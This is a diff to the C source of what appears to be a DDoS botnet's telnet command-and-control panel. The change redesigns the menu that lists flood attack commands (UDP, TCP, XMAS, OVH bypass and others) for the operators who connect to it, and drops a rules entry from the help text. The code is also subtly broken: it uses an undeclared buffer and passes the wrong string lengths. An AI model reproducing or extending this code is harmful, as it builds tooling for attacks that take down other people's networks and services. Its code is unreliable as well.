@@ -438,29 +438,41 @@ void *telnetWorker(void *sock) {
           
 if (strncmp(buf, "METHODS", 7) == 0 || strncmp(buf, "methods", 7) == 0 || strncmp(buf, "mETHODS", 7) == 0 || strncmp(buf, "Methods", 7) == 0) {
 				pthread_create(&title, NULL, &titleWriter, sock);
-				char ddosline1  [80];
-				char ddosline2  [80];
-				char ddosline3  [80];
-				char ddosline4  [80];
-				char ddosline5  [80];
-				char ddosline6  [80];
-				char ddosline12  [80];
+				char methods1  [800];
+				char methods2  [800];
+				char methods3  [800];
+				char methods4  [800];
+				char methods5  [800];
+				char methods6  [800];
+				char methods8  [800];
+                                char methods9  [800];
+                                char methods10  [800];
+                                char methods11  [800];
+                                char methods12  [800];
+                                char methods13  [800];
+                                char methods14  [800];
 
-				sprintf(ddosline1, " !* UDP [IP] [PORT] [TIME] 32 1337 400 | UDP FLOOD\r\n");
-				sprintf(ddosline2, " !* STD [IP] [PORT] [TIME] | STD FLOOD\r\n");
-				sprintf(ddosline3, " !* TCP [IP] [PORT] [TIME] 32 all 1337 400| TCP FLOOD\r\n");
-				sprintf(ddosline4, " !* STDHEX [IP] [PORT] [TIME] | STDHEX FLOOD\r\n");
-				sprintf(ddosline5, " !* XMAS [IP] [PORT] [TIME]| XMAS FLOOD\r\n");
-				sprintf(ddosline6, " !* OVH [IP] [PORT] [TIME]| OVH BYPASS\r\n");
-				sprintf(ddosline12, " !* STOP | KILLS ALL ATTACKS\r\n");
+                                sprintf(methods1, "             \e[38;2;0;229;255m╔══════════════════════════════════════════════════════╗\r\n");
+                                sprintf(methods2, "             \e[38;2;0;229;255m║ \e[38;2;89;255;0m!* UDP [IP] [PORT] [TIME] 32 1337 400 | UDP FLOOD    \e[38;2;0;229;255m║\r\n");
+                                sprintf(methods3, "             \e[38;2;0;229;255m║ \e[38;2;89;255;0m!* STD [IP] [PORT] [TIME] | STD FLOOD                \e[38;2;0;229;255m║\r\n");
+                                sprintf(methods4, "             \e[38;2;0;229;255m║ \e[38;2;89;255;0m!* TCP [IP] [PORT] [TIME] 32 all 1337 400| TCP FLOOD \e[38;2;0;229;255m║\r\n");
+                                sprintf(methods5, "             \e[38;2;0;229;255m║ \e[38;2;89;255;0m!* STDHEX [IP] [PORT] [TIME] | STDHEX FLOOD          \e[38;2;0;229;255m║\r\n");
+                                sprintf(methods6, "             \e[38;2;0;229;255m║ \e[38;2;89;255;0m!* XMAS [IP] [PORT] [TIME]| XMAS FLOOD               \e[38;2;0;229;255m║\r\n");
+                                sprintf(methods7, "             \e[38;2;0;229;255m║ \e[38;2;89;255;0m!* CRUSH [IP] [PORT] [TIME] 32 ALL 10 1024           \e[38;2;0;229;255m║\r\n");
+                                sprintf(methods10, "             \e[38;2;0;229;255m║ \e[38;2;89;255;0m!* OVH [IP] [PORT] [TIME]| OVH BYPASS                \e[38;2;0;229;255m║\r\n");
+                                sprintf(methods8, "             \e[38;2;0;229;255m║ \e[38;2;89;255;0m!* STOP | KILLS ALL ATTACKS\r\n                      \e[38;2;0;229;255m║\r\n");
+                                sprintf(methods9, "             \e[38;2;0;229;255m╚══════════════════════════════════════════════════════╝\r\n");
 
-				if(send(thefd, ddosline1,  strlen(ddosline1),	MSG_NOSIGNAL) == -1) goto end;
-				if(send(thefd, ddosline2,  strlen(ddosline2),	MSG_NOSIGNAL) == -1) goto end;
-				if(send(thefd, ddosline3,  strlen(ddosline3),	MSG_NOSIGNAL) == -1) goto end;
-				if(send(thefd, ddosline4,  strlen(ddosline4),	MSG_NOSIGNAL) == -1) goto end;
-				if(send(thefd, ddosline5,  strlen(ddosline4),	MSG_NOSIGNAL) == -1) goto end;
-				if(send(thefd, ddosline6,  strlen(ddosline4),	MSG_NOSIGNAL) == -1) goto end;
-				if(send(thefd, ddosline12,  strlen(ddosline12),	MSG_NOSIGNAL) == -1) goto end;
+				if(send(thefd, methods1,  strlen(methods1),	MSG_NOSIGNAL) == -1) goto end;
+				if(send(thefd, methods2,  strlen(methods2),	MSG_NOSIGNAL) == -1) goto end;
+				if(send(thefd, methods3,  strlen(methods3),	MSG_NOSIGNAL) == -1) goto end;
+				if(send(thefd, methods4,  strlen(methods4),	MSG_NOSIGNAL) == -1) goto end;
+				if(send(thefd, methods5,  strlen(methods4),	MSG_NOSIGNAL) == -1) goto end;
+				if(send(thefd, methods6,  strlen(methods4),	MSG_NOSIGNAL) == -1) goto end;
+				if(send(thefd, methods7,  strlen(methods7),	MSG_NOSIGNAL) == -1) goto end;
+                                if(send(thefd, methods10,  strlen(methods10),	MSG_NOSIGNAL) == -1) goto end;
+                                if(send(thefd, methods8,  strlen(methods8),	MSG_NOSIGNAL) == -1) goto end;
+                                if(send(thefd, methods9,  strlen(methods9),	MSG_NOSIGNAL) == -1) goto end;
 				pthread_create(&title, NULL, &titleWriter, sock);
 				while(1) {
 				if(send(thefd, "\r\e[38;2;89;255;0m[\e[38;2;0;229;255mSlam\e[38;2;89;255;0m@\e[38;2;0;229;255mReload\e[38;2;89;255;0m]\e[38;2;0;229;255m\e[38;2;89;255;0m ", 102, MSG_NOSIGNAL) == -1) goto end;
@@ -482,7 +494,6 @@ if (strncmp(buf, "help", 4) == 0 || strncmp(buf, "HELP", 4) == 0 || strncmp(buf,
 
         		sprintf(help1, "             \e[38;2;0;229;255m╔═══════════════════════════════════════╗\r\n");
         		sprintf(help2, "             \e[38;2;0;229;255m║ \e[38;2;89;255;0mMETHODS - Shows Attack Methods.       \e[38;2;0;229;255m║\r\n");
-        		sprintf(help4, "             \e[38;2;0;229;255m║ \e[38;2;89;255;0mRULES - Shows Rules.                  \e[38;2;0;229;255m║\r\n");
         		sprintf(help5, "             \e[38;2;0;229;255m║ \e[38;2;89;255;0mINFO - Shows Info.                    \e[38;2;0;229;255m║\r\n");
         		sprintf(help6, "             \e[38;2;0;229;255m║ \e[38;2;89;255;0mCLEAR - Clears Screen Back To Banner. \e[38;2;0;229;255m║\r\n");
         		sprintf(help7, "             \e[38;2;0;229;255m║ \e[38;2;89;255;0mEXIT - Exits Out Of Server.           \e[38;2;0;229;255m║\r\n");
@@ -490,7 +501,6 @@ if (strncmp(buf, "help", 4) == 0 || strncmp(buf, "HELP", 4) == 0 || strncmp(buf,
 
 				if(send(thefd, help1,  strlen(help1), MSG_NOSIGNAL) == -1) goto end;
 				if(send(thefd, help2,  strlen(help2), MSG_NOSIGNAL) == -1) goto end;
-				if(send(thefd, help4,  strlen(help4), MSG_NOSIGNAL) == -1) goto end;
 				if(send(thefd, help5,  strlen(help5), MSG_NOSIGNAL) == -1) goto end;
 				if(send(thefd, help6,  strlen(help6), MSG_NOSIGNAL) == -1) goto end;
 				if(send(thefd, help7,  strlen(help7), MSG_NOSIGNAL) == -1) goto end;
